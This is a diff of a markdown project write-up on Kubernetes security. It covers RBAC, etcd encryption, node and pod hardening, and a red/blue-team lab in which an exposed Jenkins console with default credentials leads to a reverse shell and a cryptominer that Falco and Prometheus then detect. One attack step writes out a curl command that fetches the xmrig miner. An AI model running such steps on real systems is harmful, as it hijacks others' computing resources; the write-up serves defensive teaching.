@@ -6,6 +6,48 @@ We propose to make an overview about ways to build a secure Kubernetes cluster. 
 
 ### Session1 - Overview of Kubernetes Security
 
+Kubernetes is an opensource microservice orchestration engine, well known for its ability to automate the deployment, management, and, most importantly, scaling of containerized applications. Kubernetes security is a combination of multiple things on multiple levels, so it's not just one or two things to keep the whole Kubernetes safe. When constructing a defense-in-depth strategy, it is necessary to incorporate numerous security barriers in various areas.
+
+The security techniques of Kubernetes are divided into four different layers, which is referred to as "The 4C Security Model": Cloud, Cluster, Container, Code. Addressing all these layers ensures comprehensive security coverage from development to deployment. In this part, some typical security strategies in Kubernetes will be introduced.
+
+#### Image Scanning
+
+First of all is **image scanning**, if we have built an application and need to deploy it in kubernetes as a container, securing workloads in kubernetes starts before they even get deployed there. The impact of the images can be from three sources: coded from untrusted registries, vulnerabilities in tools of OS or libraries, eliminate unnecessary dependencies. Then Attackers can use these vulnerabilities in the image to break out of the container and get access to host. 
+
+Therefore, we should do image scanning to make sure to build secure images. There are a lot of tools out there that can help to scan the images such as Kubei.
+
+Firstly, we can scan the images in the ci/cd pipeline. For example, before pushing the image to the repository, once the image is built, we can run a command of that image scanning tool that checks the image for any insecure tools or packages for dependencies with any vulnerabilities as well as it also checks for an insecure configuration and any hard-coded secrets.
+
+However, sometimes it could happen that a vulnerability gets discovered after an image was scanned and pushed to the repository. For example, they have a database of vulnerabilities that gets updated constantly when new ones get discovered. We can also scan in registry. Actually, a lot of image registries like docker hub and so on actually have a feature for scanning images in the repository itself, which means it's also important to scan images regularly that have already been pushed to a registry to make sure there are no vulnerabilities that appeared after the image was built.
+
+#### Users Permission RBAC
+
+Then we will discuss **RBAC**. Most Kubernetes components require authorization, roles are created to perform various tasks, and users are assigned roles based on their responsibilities and qualifications. So it’s important to manage users roles and their permissions in kubernetes and keep these permissions as restricted as possible. In this case we use RBAC strategy. RBAC helps to define who has access to the Kubernetes API and what permissions they have. We should manage the authorization policies and use RBAC properly. When using RBAC, we should always follow the principle of least privilege to ensure that users and Kubernetes service accounts have the minimal set of privileges required. We should also prefer namespace-specific permissions instead of cluster-wide permissions. Even when debugging, do not grant cluster administrator privileges. It is safer to allow access only when necessary for your specific situation.
+
+#### Secure secrets data & etcd
+
+Kubernetes secrets contain sensitive data such as a password, a token or an SSH key, and etcd stores the state of the cluster and its secrets, which is a sensitive resource and an attractive target for attackers. If unauthorized users gain access to etcd they can take over the entire cluster. Read access is also dangerous because malicious users can use it to elevate privileges. By default etcd is unencrypted and insecure, we can turn on it with command manually. 
+
+We can protect etcd in two ways, first of all is using Kubernetes own solution. Kubernetes supports encryption at rest. This will encrypt secret resources in etcd, preventing access to your etcd backups and viewing the content of those secrets. It can also ensure that the communication between users and the API server and from the API server to the kubelets is protected using SSL/TLS. We can also choose to use 3rd-party tools to manage the encryption key. In such cases, carefully review the RBAC permissions and access being request or we may compromise the security profile of your cluster.
+
+#### Nodes Security
+
+A Kubernetes [node](https://kubernetes.io/docs/concepts/architecture/nodes/) is a worker node that can be a VM or physical machine that typically runs on the Linux OS, containing the services needed to run Pods. The services running on a node include the container runtime, kubelet and kube-proxy. 
+
+To keep secure, Kubernetes nodes must be on a separate network and should not be exposed directly to public networks. What’s more, nodes should be configured to accept connections (via network access control Lists) only from the control plane through specified ports, as well as Kubernetes service connections of type NodePort and LoadBalancer. And it is also recommended to limit Secure Shell (SSH) access to the nodes.
+
+#### Pods Security
+
+A [pod](https://kubernetes.io/docs/concepts/workloads/pods/pod/) is a group of one or more containers that run on nodes and can use shared or dedicated storage. By default, there are no restrictions on which nodes may run a pod. There are lots of policies to secure the pods:
+
+Use [**network policies**](https://kubernetes.io/docs/concepts/services-networking/network-policies/) to define rules of communication for pods within a cluster. Network policies are implemented by the network plugin and using them may require a network driver that supports policies. Oracle Kubernetes Engine, for example, offers [multiple options](https://docs.cloud.oracle.com/en-us/iaas/Content/Security/Reference/oke_security.htm?source=:ex:pw:::::TNS2&SC=:ex:pw:::::TNS2&pcode=#NetworkSecurity) to secure communication to and from the workloads in the cluster. 
+
+**Pod security policies** are cluster-level resources that control the behavior of the Pod running and what it has access to. The ‘PodSecurityPolicy’ object defines a set of conditions that indicate that pods must run in an order acceptable to the system. The policies allow a customer to control runtime execution properties of the pods such as ability to run containers as privileged containers, use of the host file system, network and ports. By default, a pod may be scheduled on any node in the cluster.
+
+#### Conclusion
+
+All in all, Kubernetes provides multiple security mechanisms to ensure its own security. In addition, we can further enhance the security during the development process on the basis of the default, so as to effectively protect the system from attackers.
+
 ### Session2 - Secure Kubernetes Cluster with Falco
 
 #### The overview of Falco
@@ -263,27 +305,23 @@ A crypto-mining attack on Tesla's Kubernetes cluster occurred in 2018 and was re
 
 Among all of the different kinds of *malware*, **Cryptominer attacks** are one of the main threats in *cloud-native* environments. The basic idea under this kind of attack is that you should jointly share your computational resources with the attacker so that he can mine cryptocurrencies at your expense. Other threats are easier to be recognized but in the case of cryptominers, it is hard to discern its activity from that of harmless processes. But there are some last-line defence methods to recognize them:
 
-1. Observe networking activity to specific endpoints (`domain_name`:`port`). *See method 1,2 in Step 3.*
-2. Observe resource usage and compare it with a baseline. *See method 3 in Step 3.*
+1. Monitor networking activity to specific endpoints. *See method 1,2 in Step 3.*
+2. Monitor resource usage and compare it with a baseline. *See method 3 in Step 3.*
 
 And thanks for [sysdig group](https://sysdig.com) to provide such fabulous lab environment.
 
 ##### Senario Explanation
 
-1. Somebody deployed Jenkins and:
-   - Did not change the default access credentials (`admin`/`admin`)
-   - Exposed the admin dashboard to the internet.
-2. An attacker might gain full access with these two basic misconfigurations. And then, execute arbitrary code through the *Script Console* using *Groovy*.
-3. From here, a **reverse-shell** is executed, and the attacker has full access to execute arbitrary code in the Jenkins container. The cluster node is not compromised, but any code can be executed in this pod.
-
-------
-
 In the next steps, we play the *red* and *blue team* roles to:
 
-- Reproduce a real attack step by step in the K8s cluster
-- Detect the intrusion with different last-defense methods
+The attacker (red team) executes a **reverse-shell** and the defender (blue team) will detect the intrusion using Falco and Prometheus as last-defense.
 
-The attacker (red team) executes a **reverse-shell** and the defender (blue team) will explore several open source alternatives to detect and respond to the attack.
+1. Blue team deployed Jenkins and:
+   - Did not change the default access credentials (`admin`/`admin`)
+   - Exposed the admin dashboard to the internet.
+2. Red might gain full access with these two basic misconfigurations. And then, execute arbitrary code through the *Script Console* using *Groovy*.
+3. From here, a **reverse-shell** is executed, and the red team has full access to execute arbitrary code in the Jenkins container. Now any code can be executed in this pod.
+4. Blue team use Falco rules and Prometheus to detect the anomaly to alert the user for further action.
 
 ##### Steps
 
@@ -342,7 +380,7 @@ apt remove curl -y
 apt install curl -y
 ```
 
-	2. Download, install and run crypto miner.  (For now, the lab enviroment is down and for safety concerns, we didn't actually run the attack, we demostrate the way to detect and defense in the following steps).
+2. Download, install and run crypto miner.  (For now, the lab enviroment is down and for safety concerns, we didn't actually run the attack, we demostrate the way to detect and defense in the following steps).
 
 ```shell
 curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
@@ -717,8 +755,4 @@ https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt
 [9] New Linux Vulnerability CVE-2022-0492
 
 https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
-
-
-
-### Conclusion
 
